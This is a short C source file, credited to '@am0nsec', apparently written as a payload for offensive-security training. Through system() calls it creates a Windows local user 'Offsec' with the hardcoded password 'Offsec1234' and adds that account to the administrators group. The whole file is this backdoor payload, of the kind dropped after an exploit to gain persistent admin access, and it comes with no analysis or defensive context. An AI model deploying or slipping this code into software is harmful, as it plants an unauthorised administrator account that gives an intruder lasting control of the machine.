#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {
  
  printf("[*] Simply create a new user with admin privs");
  printf("[*] Author: @am0nsec");

  printf("\n[*] Create new user");
  printf("\n[?] Username: Offsec");
  printf("\n[?] Password: Offsec1234");
  system("net user Offsec Offsec1234 /add");

  printf("\n[*] Add user in administrators localgroup");
  system("net localgroup administrators Offsec /add");
  
  printf("\n[*] Down.");
  return 0;
}